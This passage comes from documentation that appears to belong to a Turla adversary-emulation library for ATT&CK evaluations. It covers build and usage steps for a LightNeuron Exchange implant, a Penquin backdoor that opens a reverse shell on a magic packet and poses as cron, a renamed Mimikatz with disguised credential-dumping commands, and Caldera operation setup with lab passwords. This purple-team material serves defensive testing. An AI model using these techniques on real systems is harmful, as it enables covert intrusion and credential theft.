broken up into the following components:","Component","Description","Transport Agent","Microsoft transport agent","Companion DLL","Malicious companion code","PowerShell Install Script","Installs the transport agent","Configuration File","Configuration of companion DLL C2 communications","Rule File","Configuration of LightNeuron's email processing behavior"]},{"l":"Build Instructions"},{"l":"Transport Agent","p":["Run the following to recompile the transport agent DLL from the Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory:","NOTE: if compiling in a different directory than the original project directory, the Microsoft.Exchange.Data.Common.dll and Microsoft.Exchange.Data.Transport.dll must be located in the directory where the command is being executed. These binaries can be copied from an installed version of Exchange."]},{"l":"Companion DLL","p":[".\\vcpkg\\bootstrap-vcpkg.bat","Add C:\\tools\\msys64 to your PATH environment variable to run msys2. Reopen console windows to register the new env variable.","C:\\Program Files\\CMake\\bin or equivalent CMake bin folder","C:\\tools\\msys64\\mingw64\\bin or equivalent Mingw-w64 bin folder","choco install cmake --installargs 'ADD_CMAKE_TO_PATH=System'","choco install msys2","Download the repository to C:\\vcpkg","Ensure the following paths are set in the SYSTEM environment PATH variable (note that these may differ in your environment depending on how you installed CMake and mingw64).","git clone https://github.com/Microsoft/vcpkg.git","If cmake was already installed but is not in your path, add it to your path manually (e.g. C:\\Program Files\\CMake\\bin)","Install vcpkg onto your system","Make sure CMake is installed on your machine","Make sure mingw64 is installed on your machine. In this particular example, msys2 was installed and used to install mingw64.","pacman -S --needed base-devel mingw-w64-x86_64-toolchain","pacman -Syu","Paths to folders containing gcc and g++ compilers if not already included in the above Mingw-w64 path folder.","Reopen console windows to register the new env variables.","Run msys2 and within the new prompt, run the following:","Run the following to compile the Companion dll for use by the transport agent. File was originally compiled on Windows 10","You will need to restart the shell to use cmake."]},{"l":"Test Instructions"},{"l":"Test Instructions for Transport Agent","p":["Tests were run from a Windows machine using PowerShell and will interact with the Exchange server provided as an argument to the script. The Windows host should be able to resolve the Exchange server's hostname properly.","These tests will copy the transport agent DLL and TestIngestStruct DLL, install the transport agent, test functionality by sending emails, checking DLL log files, and checking inboxes, then uninstall the transport agent and remove all files.","NOTE: This test script is dependent on Microsoft.Exchange.WebServices.dll. This binary can be copied from an installed version of Exchange and should be placed in the same directory where the test script is being executed from.","Ensure the transport agent is built using the above command and the DLL is located in the TransportAgent\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory","Ensure the Microsoft.Exchange.WebServices.dll is located within the Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests directory. If not, this DLL can be downloaded from the binaries available in an installed Exchange server.","Change directory into the Microsoft.Exchange.Transport.Agent.ConnectionFiltering.Tests directory:","Run the PowerShell script testing transport agent functionality:"]},{"l":"Test Instructions for Companion DLL","p":["Unit tests were run on a Windows machine using CMake. Running this will also build the script in the CompanionDLL\\util directory.","Set up and run tests via Powershell from the Companion DLL Directory to check:"]},{"l":"Test Instructions for Full Implant Testing","p":["Open an admin PowerShell in the LightNeuron directory","Run the following to install all components of LightNeuron:","This will copy over the rule file, configuration file, Companion DLL (from the CompanionDLL/data directory), and the transport agent Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll(from the TransportAgent/Microsoft.Exchange.Transport.Agent.ConnectionFiltering directory).","Once the setup script has finished executing, you may begin sending emails that will be collected by LightNeuron as indicated by its rule file","To tear down the full implant testing, run the following from the same admin PowerShell terminal from earlier (or open a new admin PowerShell) to delete all artifacts:"]},{"l":"Usage Examples"},{"i":"transport-agent-1","l":"Transport Agent","p":["Copy the Transport Agent DLL to the Exchange server at: C:\\Program Files\\Microsoft\\Exchange Server\\v15\\TransportRoles\\agents\\Hygiene\\Microsoft.Exchange.Transport.Agent.ConnectionFiltering.dll.","For testing with the TestIngestStruct, copy the TestIngestStruct.dll to the same directory as the Transport Agent DLL.","Copy msita.ps1 to the Exchange Server and execute from an Admin PowerShell.","Sending emails between users should now be logged in the LightNeuron log file. The TestIngestStruct DLL will also log email data of the most recent email received at the file: C:\\Windows\\serviceprofiles\\networkservice\\appdata\\Roaming\\Microsoft\\Windows\\TestIngestDebug"]},{"l":"Analyzing a Test Image","p":["Under CompanionDLL\\util an executable is included to use the steganography portion of the Companion DLL without needing to use the rest of the implant. This is useful for verifying that returned images being sent to the implant contain the expected result.","Note: The current implementation will encrypt the resulting command output before embedding it in the output file, so if you open the image in a hex editor it will still look like random data."]},{"l":"Using the Executable","p":["Building the Executable","Follow the same steps as building the unit tests.","When running the build command, it will automatically rebuild the analyze_image.exe binary.","Generate the image using the C2 server","Run the C2 server like normal, then call the lightneuron handler with whatever command you want to test.","Even without being able to send the image, a snake_modified.jpg image will be generated, this is the image to use for testing.","Note: Encryption must be enabled for this image to work with the implant. To enable encryption on the C2 server, set the encryption flag to true in the implant config.","Note: Take note of the signature key that is used when generating the image, it will be needed to run this utility script. The key is hardcoded into the C2 server handler, it's currently set to: pwndsnek","Run the Executable","Copy the snake_modified.jpg image to the same folder as the executable.","Run the executable with the path to the image and signature key.","Using default filename and key from C2 server:","If successful, the resulting image will be written to: output.jpg","This image can now be dropped in the pickup folder of the C2 server to be analyzed and see the result."]},{"l":"Cleanup Instructions"},{"l":"Removing installed transport agents"},{"l":"Manually cleaning files from the Exchange Server","p":["Open and run Exchange Management Shell as Administrator. Execute the following:","Remove the LightNeuron log file:","If using the TestIngestStruct, remove the debug file:"]},{"l":"Automated cleanup","p":["Please see the LightNeuron section in the Resources/cleanup directory"]},{"l":"Misc"},{"i":"msiexps1","l":"msiex.ps1","p":["Install Microsoft Exchange Transport Agent","CTI indicates PowerShell installer script file name was msinp.ps1. This has been tweaked to msiex.ps1 instead."]},{"l":"CTI Evidence","p":["https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf"]},{"l":"References","p":["https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-an-smtpreceiveagent-transport-agent-for-exchange-2013","https://docs.microsoft.com/en-us/exchange/client-developer/transport-agents/how-to-create-a-routingagent-transport-agent-for-exchange-2013","https://stackoverflow.com/a/13935718","https://github.com/ReneNyffenegger/cpp-base64","https://github.com/zeux/pugixml"]}],[{"l":"Penquin","p":["Penquin is a backdoor for re-activating access to servers over long term engagements. Penquin installs a BPF filter, mimicing cron, to listen on a servers network interface. When turla sends an activation packet to the targeted host, a reverse shell is activated.","Penquin is broken into the following components:","Component","Description","sniff.c","Executes cron as a child process while deploying a BPF network sniffer that waits for a matching packet. Once the matching packet it recieved, a reverse shell is executed. The reverse shell was based on the common usage of this method captured in the ExaTrack Report","cron.h","A header file containing the byte array of the compiled sniff.c program (generated using the build script ( build_Penquin.sh)","main.c","Writes Penquin to disk, then installs and executes Penquin masquerading as cron","sendPacket.py","Sends an activation packet to a targeted host","crypt.h","Obfuscates strings (max 64 char) at compile time - Deobfuscates strings at runtime"]},{"i":"usage-example---manual-execution","l":"Usage Example - Manual Execution","p":["This assumes you are running as root on the target Ubuntu system.","From the /root/ folder, execute penquin. Total time 8 seconds to execute. There is no expected terminal output.","Remove penquin from disk."]},{"l":"Execution checks","p":["Verify cron is running cron. /usr/bin/cron -f is our evil cron, usr/sbin/cron -f is real cron.","Results should look like...","Based on the Leonardo Report and Presentation, Penquin deploys a legitimate version of the Linux utility cron and executes cron as a child process of Penquin. However, reporting was unclear on the series of events between Penquinâs initial execution and the execution of cron. To address this gap, Red Team developers hypothesized the below process tree was the objective of deploying cron, Masquerading Penquin as real cron. In order to provide this process tree, we leveraged the Create or Modify System Process: Systemd Service technique to execute Penquin.","Target Process Tree","Verify the socket is actively listening.","p_raw is where our evil cron is listening."]},{"i":"activation-packet-aka-magic-packet","l":"Activation Packet (AKA Magic Packet)"},{"l":"On Attacker Host","p":["These steps assume sniff.c(compiled) is already running on the victim host. On the attacker host, start a listener and execute this script. This script sends a crafted packet to the victim host activating a reverse shell connecting to the listener.","Install all requirements","In a terminal window, set up a netcat listener. Using 8081 ensures we are not conflicting with other listeners in this scenario.","Open a second terminal window and navigate to the /turla/Resources/Penquin directory. Execute the sendPacket.py script. Update IPs/ports as needed - Penquin currently sniffs on all ports on the victim machine for the magic packet. Port 8080 is used based on Lab52's report.","You will see the packet info in the terminal screen + the hexdump of the packet. The terminal output Sent 1 packets confirms the packet was successfully sent.","Check the terminal window with the netcat listener, the reverse shell should be running inside the victim's /root directory.","Make sure that the ipaddress inside the python file is correct. The default configuration will trigger the reverse shell to localhost (127.0.0.1) on port 6792. This can be changed by specifying a custom hander IP address using --handler_ip IP Address and the port can be changed using --handler_port port. The target where the penguin implant resides can be set using --target_ip IP Address and the port can be adjusted using --target_port port.","The penguin implant currently only supports plain text base64 encoded payloads. This can be set in the packet generator using --payload_type base64 alternatively, an AES encrypted payload can be sent using --payload_type aes."]},{"l":"Build Instructions"},{"l":"Requirements","p":["-lpcap= is used to statically link the lpcap library - this is consistent with CTI reporting in the Leonardo Report.","-o= names the output file (default is a.out)","-O3= optimizes the code","-s= gcc's version of the strip command","Add extern to variables contained in the header file","Binary is now ready for deployment in operations. Continue to next section if only testing execution locally.","build-essential","compile penquin program with the header file containing the sniffer binary","Compile the sniffer into a binary","Context on cron utility usage: Based on reference article.","Convert the sniffer binary into a header file using xxd","Ensure the GCC version is compatible between build host & victim host","Execute the build script ( build_Penquin.sh).","libpcap-dev","Navigate to the /Resources/Penquin/ folder","Results should look like the following:","Summary of Build Process","The following must be installed on the Ubuntu dev host:","Verify the build_Penquin.sh exists in the folder with executable permissions.","Verify the Penquin binary is present. The binary location is provided in the last line of the terminal output."]},{"l":"Testing","p":["This assumes the build script ( build_Penquin.sh) has been executed with the resulting binaries in the folder. Summary of testing process","Moves penquin to /root/ folder","Executes penquin","Verifies penquin was executed as expected","Requires sudo privileges to execute","Navigate to the /Resources/Penquin/ folder","Verify the execution_penquin_test.sh exists in the folder with executable permissions.","Run the following command on the victim host","Results should look like the following:"]},{"l":"Cleanup Instructions","p":["Summary of clean up process:","Removes all files dropped to disk","Kills all processes associated with our cron service in /usr/bin/","Reloads the cron service back to it's original state operating from /usr/sbin","Requires sudo privileges","Navigate to the /Resources/cleanup/Penquin/ folder","Verify the cleanup_penquin.sh exists in the folder with executable permissions.","With sudo, Execute the following command in the /Resources/cleanup/Penquin/ folder.","Expected output```bash Destroying all the Penquins..."]},{"l":"Misc"},{"l":"CTI Evidence","p":["Leonardo Report","Other projects (cd00r.c & LOKI2) referenced in the Kaspersky - Penquins Moonlit Maze Report","Leonardo Presentation","cd00r.c","LOKI2 - Phrack Volume 7, Issue 51 and github code from JeremyNGalloway","Activation Packet Lab52"]},{"l":"References","p":["Filter uses reference code from DevDungeon","Stuart McMurray - Offensive pcap presentation","C string obfuscation crypt.h - BroOfBros"]},{"l":"Troubleshooting","p":["Identify all processes associated with our evilcron, note the process group number in the list, it should be the same for most of them.","Kill the process group for cron. Copy/Paste the process group id (3rd column of numbers from left to right) in place of the PGID placeholder in the below command. After executing, the entire process tree should be killed. Verify with ps -efj | grep cron command or ps -Hlwwfe. :ax: (i.e. kill -- -252557)","Use the below command to check the status of cron. If the status blurb is the same as below, penquin is NOT running.","The status message should resemble the below blurb:"]}],[{"l":"Updates to the Mimikatz bin","p":["The original mimikatz version used can be found at: https://github.com/gentilkiwi/mimikatz","Modifications:","Mimikatz was renamed to DvKGMmGn.exe","Renamed all common files/functions.","Removed descriptive strings, and other strings as seen.","Stripped out unused functionality","Changed icon"]},{"l":"Command Changes","p":["privilege::debug is now pr::d","sekurlsa- slsa","lsadump- lsdu","logonpasswords- lop","privilege- pr","token- mrio","elevate- 1up","pass the hash is now called with slsa::htp","logonpasswords is called with slsa::lop","lsadump::lsa is now lsdu::go(/inject is now /ynot) (/patch is now /pooch)","exit was changed to quit"]},{"l":"Custom PSExec Commands","p":["Adding /remotepc:pcname to pass-the-hash is the first argument to initiate psexec and is always required. (you do not need to add backslashes \\\\)","The path to psexec is always required: /pexe:C:\\Path\\to\\PSExec.exe","If you want to execute psexec's -c command then you use: /prun:c:\\path\\to\\executable.exe","Output console text to a file: /out:C:\\outfile.txt(adds c:\\outfile.txt to the psexec command)","Use /sys:1 to add psexec -s(run as system).","Full mimikatz command executing psexec -c:","Resulting command created/executed by mimikatz:"]},{"l":"Executing example commands","p":["Executing an LSA Dump: mimikatz.exe privilege::d lsdu::go /ynot"]},{"l":"Adjustments made to mimikatz PTH function","p":["The pass-the-hash function was modified to accept additional arguments since mimikatz PTH did not allow for arguments as a part of the PTH command."]}],[{"l":"Turla Emulation Plans","p":["An emulation plan is the primary document used to execute the red team scenario during a purple team operation. This document includes red team execution commands, links to source code, ATT&CK techniques leveraged, and CTI reporting references.","When we have multiple emulation plans, we break these plans into scenarios and provide a description of the plan's focus.","Emulation Plan","CTI Operations Flow","Description","Carbon Scenario","Carbon Operations Flow","This directory contains the scenarios developed focusing on Turla's usage of Carbon. This plan was used to conduct ATT&CK Evaluations Enterprise Round 5 in 2023","Snake Scenario","Snake Operations Flow","This directory contains the scenarios developed focusing on Turla's usage of Snake. This plan was used to conduct ATT&CK Evaluations Enterprise Round 5 in 2023.","Caldera Support Files","This directory contains the setup instructions and data for porting the above scenarios into Caldera"]}],[{"l":"Caldera Port of Turla"},{"l":"OVERVIEW","p":["The Turla port contains two adversary profiles for each of the executed scenarios in MITRE Engenuity's ATT&CKÂ® Evaluations: Enterprise - Round 5. Follow the setup instructions below and then navigate to the scenario-specific setup guides for the profile you would like to execute:","Carbon Scenario","Snake Scenario","Information about each scenario can be found here."]},{"l":"DEPENDENCIES"},{"l":"CALDERA C2 Server","p":["Linux/Mac OS, 64-bit","git commandline installed","python3.8+ with pip3","golang 1.17+","required for dynamic agent compilation","Recommended hardware is 8GB+ RAM and 2+ CPUs"]},{"l":"Attacker Machine Dependencies","p":["Linux OS, 64-bit","Kali recommended","Can be the same machine as the CALDERA C2 server","Command-line tools","xfreerdp","xdotools","curl","urllib3","ncat (by Nmap)"]},{"l":"SETUP"},{"l":"Download and Install CALDERA","p":["Run the following on a Linux/Mac machine of your choice. This machine will act as your C2 server, or the \"attacker\" host. For the purposes of this walkthrough, the C2 server will have an IP address of 176.59.15.33.","Add the emu plugin to your conf/local.yml configuration file. Feel free to enable or disable other plugins by adding/removing them from the configuration file. You can also configure your user accounts and credentials if needed.","Download pip dependencies.","Download required payloads for emu plugin.","Run your C2 server from the caldera directory. This will unzip encrypted executables throughout the adversary-emulation-library and ingest its emulation plans."]},{"i":"compile-snake--mimikatz-binaries","l":"Compile Snake & Mimikatz Binaries"},{"l":"Snake","p":["â Snake has not been included in this binaries.zip. Please visit the following resources for building Snake and its components:","Snake Installer Build","Snake Build Script"]},{"l":"Mimikatz","p":["â Mimikatz must be modified and compiled according to these instructions."]},{"l":"Launch the Kali Agent","p":["RDP to 176.59.15.33, the Kali attacker host, as user dev with password DevPass12345. Launch the Kali agent by running the following command. You may need to modify the command so the server value matches your attacker host's IP address.","â Keep this RDP open as this will be leveraged by xfreerdp in the executed Caldera operation. Once the operation has been started, avoid interacting with the RDP to Kali. Clicking or switching windows within the Kali RDP will interfere with the user activity that is automated through Caldera.","Log into CALDERA's web GUI by accessing your C2 server address in a web browser (Chrome recommended), and using your credentials (default username is red, default password is admin).","On the left sidebar, under \"Campaigns\", click \"agents\" and confirm that you see the Kali agent beaconing in.","For best results, make sure you don't have other agents currently beaconing in."]}],[{"l":"Caldera port of Turla Carbon","p":["The guide contains continued setup information for the Caldera port of the Turla Carbon scenario. If you have not yet set up Caldera, please refer to the initial setup instructions first."]},{"l":"STARTING THE CONTROL SERVER","p":["On the attacker machine, open a new terminal window and run the following to start the C2 server:","Ensure that the Carbon & Epic handlers start up before continuing to the next step."]},{"l":"FACT SETUP","p":["apache.server.ip: The IP address of the Apache server.","attacker.host.ip: The IP address of the attacker's host.","Before running the operation, you will need to make sure that the Turla fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select Turla - Carbon (Emu), which is the fact source for the Turla adversary. From there, update the following facts as needed:","first.carbon.id: The first Carbon implant ID.","first.epic.id: The first EPIC implant ID.","first.target.host: The hostname of the first target host.","first.target.ip: The IP address of the first target host.","first.target.password: The password of the first target host.","first.target.user: The username of the first target host.","Generally, itâs only possible to task a Caldera agent which is alive and actively checking in with the Caldera server. However, due to the integration between the evalsc2client.py and the Caldera Emu plugin in this port, the user is effectively tasking the Sandcat agent to task evalsc2client.py to task an implant through the Control Server, which makes it possible to task an implant that is not active. Therefore, a Caldera requirement was implemented to prevent an ability from executing if the implant tasked in that ability was not actively beaconing in. This requirement uses the facts for the EPIC and Carbon implant IDs, which are listed above.","network.domain.name: The network domain name for initial target system.","second.carbon.id: The second Carbon implant ID.","second.epic.id: The second EPIC implant ID.","second.target.host: The hostname of the second target host.","second.target.ip: The IP address of the second target host.","second.target.password: The password of the second target host.","second.target.user: The username of the second target host.","third.carbon.id: The third Carbon implant ID.","third.target.host: The hostname of the third target host.","third.target.ip: The IP address of the third target host.","third.target.ntlm: The NTLM hash for the third target user.","third.target.password: The password of the third target host.","third.target.user: The username of the third target host."]},{"l":"RUNNING THE OPERATION","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select Turla - Carbon (Turla).","For the Fact Source, select Turla - Carbon (Emu).","For the Parser, select \"Do not use default parsers\".","For the Planner, select the atomic planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes."]},{"l":"Cleanup","p":["To remove artifacts following operation, follow the Cleanup instructions for the Carbon Scenario."]},{"l":"DEVIATIONS FROM THE ORIGINAL EMULATION PLAN"},{"l":"Step 1","p":["Rather than navigating to https://brieftragerin.skt.local/owa, logging in, and clicking the link in the email from noreply@sktlocal.it, the port will download NTFVersion.exe by navigating directly to http://anto-int.com/NTFVersion.exe in the Edge browser."]},{"l":"Step 8","p":["The password Password2! is hardcoded into the ability to ssh into the Apache server. If your password is not Password2!, you will need to edit the xdotool commands in the ability named \"Adalwolfa types keylogged data (User)\" to include your specific password.","The port does not include Adalwolfa opening the Edge browser and navigating to http://kagarov/index.html. It also does not include Adalwolfa editing the /var/www/html/index.html file."]}],[{"l":"Caldera port of Turla Snake","p":["The guide contains continued setup information for the Caldera port of the Turla Snake scenario. If you have not yet set up Caldera, please refer to the initial setup instructions first."]},{"l":"PREPARING THE TARGETS","p":["Start by logging into the second target host (file server) as the domain admin user. Then, disconnect the RDP (do not log off). This is required for Step 16 credential dumping to succeed.","Log every other target user into their intended workstation and open Edge at least once to ignore any first time prompts. Log out of sessions.","Copy Microsoft.Exchange.WebServices.dll from an existing Exchange server to turla/Resources/caldera_port."]},{"l":"STARTING THE CONTROL SERVER","p":["On the attacker machine, open a new terminal window and run the following to start the C2 server:","Ensure the EPIC, Snake, and LightNeuron handlers start up before continuing to the next step."]},{"l":"FACT SETUP","p":["Additionally, a separate Caldera requirement was implemented for the Lightneuron implant. This requirement will allow an ability to execute if the Lightneuron implant ID is listed in the agents tab of the Caldera Server GUI, even if the agent is dead and untrusted. The Lightneuron agent only sends one initial beacon to the Server, and is then considered a dead agent. This custom requirement will allow Lightneuron to be tasked despite that fact that it appears dead in the Caldera GUI.","Before running the operation, you will need to make sure that the Turla fact source is properly configured for your environment. While default fact values are provided, they will need to be replaced by the appropriate values specific to your testing environment. On the left menu, under Configuration, select fact sources. Under the \"Select a source\" drop-down menu, select Turla - Snake (Emu), which is the fact source for the Turla adversary. From there, update the following facts as needed:","domain.admin.ntlm: The NTLM of a domain admin.","domain.admin.user: The username of a domain admin.","file.server.admin: The username of the file server admin.","first.epic.id: The first EPIC implant ID.","first.snake.id: The first Snake implant ID.","first.target.ip: The IP address of the first target host.","first.target.password: The password of the first target host.","first.target.user: The username of the first target host.","fourth.target.host: The hostname of the fourth target host.","Generally, itâs only possible to task a Caldera agent which is alive and actively checking in with the Caldera server. However, due to the integration between the evalsc2client.py and the Caldera Emu plugin in this port, the user is effectively tasking the Sandcat agent to task evalsc2client.py to task an implant through the Control Server, which makes it possible to task an implant that is not active. Therefore, a Caldera requirement was implemented to prevent an ability from executing if the implant tasked in that ability was not actively beaconing in. This requirement uses the facts for the EPIC and Snake implant IDs, which are listed above.","lightneuron.implant.id: The Lightneuron implant ID.","network.domain.name: The network domain name for initial target system.","new.domain.password: The password of the new domain user.","new.domain.user: The username of the new domain user.","second.snake.id: The second Snake implant ID.","second.target.host: The hostname of the second target host.","second.target.ip: The IP address of the second target host.","second.target.password: The password of the second target host.","second.target.user: The username of the second target host.","third.snake.id: The third Snake implant ID.","third.target.host: The hostname of the third target host.","third.target.ip: The IP address of the third target host.","third.target.password: The password of the third target host.","third.target.user: The username of the third target host."]},{"l":"RUNNING THE OPERATION","p":["Add in an appropriate name for your operation.","Adjust Jitter as needed if you want the operation steps to occur with greater or lesser frequency.","After adjusting the fact source as needed, select operations from the left menu, under \"Campaigns\".","For Auto-close, you can decide whether or not you want the operation to auto-terminate or stay open until someone terminates the operation.","For Autonomous, make sure \"Run Autonomously\" is selected.","For Group, make sure All Groups is selected.","For Run state, make sure \"Run immediately\" is selected.","For the adversary profile, select Turla - Snake (Turla).","For the Fact Source, select Turla - Snake (Emu).","For the Parser, select \"Do not use default parsers\".","For the Planner, select the atomic planner.","Keep visibility at 51.","Make sure the plain-text obfuscator is selected.","Select \"+ Create Operation\" to the right of the drop-down menu.","Select Advanced to expand the Advanced configurations.","When ready, hit the Start button and wait for your operation to complete."]},{"l":"TERMINATING THE OPERATION","p":["Press the stop button in the operation GUI to finish the operation. Terminate the Kali agent from the GUI or RDP/SSH into the machine to stop the agent processes."]},{"l":"Cleanup","p":["To remove artifacts following operation, follow the Cleanup instructions for the Snake Scenario."]},{"l":"DEVIATIONS FROM THE ORIGINAL EMULATION PLAN"},{"l":"Step 11","p":["User executes NTFVersion.exe via Run prompt instead of double clicking from Downloads folder."]}],[{"l":"Carbon Scenario","p":["For ATT&CK Evaluations Enterprise Round 5, the Carbon scenario was developed to emulate Turla's utilization of the following software:","Epic","Carbon","PsExec","Mimikatz","Keylogger","Penquin"]},{"l":"Detections Scenario","p":["This 10 step scenario was created for the Detections portion of ATT&CK Evaluations Enterprise Round 5, where all prevention mechanisms and protection tooling is disabled to allow the full emulation plan to execute unobstructed. This allows the scenario to be executed from beginning to end, with each step building upon the previous. and for telemetry on red team activity to be gathered in full."]},{"l":"Protections Scenario","p":["The scenario created for the Detections portion was modularized into 7 discrete tests to create the Protections portion of ATT&CK Evaluations Enterprise Round 5, where prevention mechanisms and protection tooling is enabled. This highlights protection capabilities of the deployed solution and encourages blocks of red team activity as early as possible. For this reason, this version of the scenario was designed to removes the dependencies between each step."]},{"l":"Infrastructure","p":["This scenario was executed on the following infrastructure:","Carbon Infrastructure Diagram","Reference setup for guidance on deploying the infrastructure used by this scenario."]}],[{"l":"Carbon Protections Scenario","p":["Legend of symbols:","\uD83D\uDCA1 - callout notes","â - extremely important note","â¡ï¸ - Switching to another session","â­ - Sign out of something"]},{"l":"Protections Setup","p":["â¡ï¸ RDP, do not SSH, to the Kali attacker machine (176.59.15.33).","Open a new terminal window, cd to the cloned repo control server, and start the control server:","Within your Kali control server terminal window, right click and select\"Split Terminal Horizontally\". Be careful not to terminate the control server.","In the new terminal window, change directory to the control server repo:","Ensure that the Carbon and EPIC handlers started up."]},{"i":"test-1-initial-access-via-spearphishing-link","l":"Test 1: Initial Access via Spearphishing Link","p":["\uD83C\uDFA4 Voice Track:","Test 1 emulates Turla gaining initial access via a spearphishing link sent in an email to the user Gunter.","The link initiates the download of a fake software update executable named NTFVersion.exe."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â¡ï¸ RDP to hobgoblin (10.20.20.102) as Gunter:","Username","Password","skt\\Gunter","Password1!","Open Microsoft Edge, declining all first-run options, and browse to https://brieftragerin.skt.local/owa. Login:","Open the email from noreply@sktlocal.it and click the link in the email to initiate the download of NTFVersion.exe. â DO NOT EXECUTE THE FILE.","Open File Explorer and browse to Downloads"]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["EPIC Dropper","File write of EPIC injector as mxs_installer.exe","Registry modification"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf"]},{"i":"test-2-epic-and-carbon-on-workstation","l":"Test 2: EPIC and Carbon on Workstation","p":["\uD83C\uDFA4 Voice Track:","Test 2 emulates user execution of the EPIC dropper, execution of the EPIC injector via the Winlogon shell registry key value, and execution of the Carbon installer."]},{"i":"procedures","l":"â£ï¸ Procedures","p":["â Verify that the ViperVPNSvc service shows up in the tasklist output towards the end.","â¡ï¸ Minimize (do not close) the hobgoblin RDP window.","â¡ï¸ Open up a new terminal tab in your Kali machine using Ctrl+Shift+T, name this tab \"smbclient\" and copy the EPIC injector to the Windows host hobgoblin:","â¡ï¸ RDP into bannik (10.20.10.9), as Frieda:","â¡ï¸ Re-RDP to hobgoblin (10.20.20.102) as Gunter:","â¡ï¸ Return to your RDP to hobgoblin. Open File Explorer and browse to Gunter's Downloads folder.","â¡ï¸ Set a timer for 2 minutes then switch to your Kali control server terminal and confirm that a new implant has registered and the automated discovery output has been returned in the server log.","â¡ï¸ Switch back to your Kali terminal and task the SYSTEM level EPIC implant to download the CARBON-DLL installer:","â¡ï¸ Switch to your Kali attack station and confirm that a new elevated implant has registered.","â­ Wait 1 minute then close out of all tabs and sign out of the RDP session to hobgoblin as Gunter.","CARBON-DLL should inject into the Microsoft Edge process and beacon back to the C2 server. Check that there is a new Carbon implant session registered with the C2 server","Close any spurious windows.","Double click and run NTFVersion.exe","â¹ï¸ Starting the ViperVPN service should take at least 30 seconds and eventually result in an error [SC] StartService FAILED 1053. The EPIC injector will wait an additional 2 minutes before performing injection. If the [SC] StartService FAILED 1053 error occurs in less than 10 seconds and/or you don't receive a new session, contact your Evals lead.","In your lower terminal tab, copy and paste the first set of discovery commands:","NOTE: The injector will wait 2 minutes, before injecting EPIC's Guard DLL into explorer.exe and, subsequently, EPIC's worker DLL into Microsoft Edge.","Open Microsoft Edge and browse to https://brieftragerin.skt.local/owa.","Open up an administrative Powershell session and run the following commands to remotely restart the service:","Password","Password1!","Password3!","skt\\Frieda","skt\\Gunter","This should return:","Username","Wait for the command to return and then â­ sign out of your RDP session to bannik as Frieda","Wait for the command to return and then task the Carbon implant to execute some discovery commands:","Wait for the command to return and then task the EPIC implant to execute the CARBON-DLL installer:","Wait for the command to return before tasking EPIC to modify the misconfigured ViperVPNSvc service to use our implant to execute:","Wait for the command to return before tasking the next command to query the service and who can access it:","Wait for the command to return.","Within your Kali control server terminal window, right click and select \"Split Terminal Horizontally\". Be careful not to terminate the control server."]},{"i":"source-code","l":"\uD83D\uDDFF Source Code","p":["AES encrypted","base64 encoded","Beacon and task retrieval over HTTP","bzip2 compressed","C2 communications are:","CARBON-DLL Comms Lib","CARBON-DLL installer","CARBON-DLL Orchestrator","Comms Lib DLL Injection","Create Loader Service","Directory discovery DirectoryDiscovery","Drop components","EPIC Dropper","EPIC Guard","EPIC injector","EPIC Payload","Execute commands ExecCmd","Extract EPIC Guard DLL from resources section FindResourceW","Extract EPIC payload DLL from resources section FindResourceW","File download DownloadFile","File write of EPIC injector as mxs_installer.exe","Loader Service","Registry modification","RSA encrypted AES key","Service registry edits: 1, 2","Start Loader Service","Targeting browser processes for DLL injection","Targeting explorer.exe for DLL injection","Task Execution","Upload task output over HTTP","User discovery GetAllUsers","Write results to log file WriteResults"]},{"i":"cited-intelligence","l":"\uD83D\uDD2C Cited Intelligence","p":["https://securelist.com/the-epic-turla-operation/65545/","https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=4501a782-fd84-4f44-a231-ee2a3e838c39CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68tab=librarydocuments","https://www.govcert.ch/downloads/whitepapers/Report_Ruag-Espionage-Case.pdf","https://securelist.com/analysis/publications/65545/the-epic-turla-operation/","https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/waterbug-attack-group.pdf","https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08080105/KL_Epic_Turla_Technical_Appendix_20140806.pdf","https://recon.cx/2018/brussels/resources/slides/RECON-BRX-2018-Visiting-The-Snake-Nest.pdf","https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf","https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/","https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html","https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra"]},{"i":"test-3-password-spray","l":"Test 3: Password Spray","p":["\uD83C\uDFA4 Voice Track:","Test 3 emulates Turla laterally moving to the domain controller by conducting password spraying via a batch script to retrieve a domain admin's credentials to the domain controller. The batch script sprays several of the discovered domain 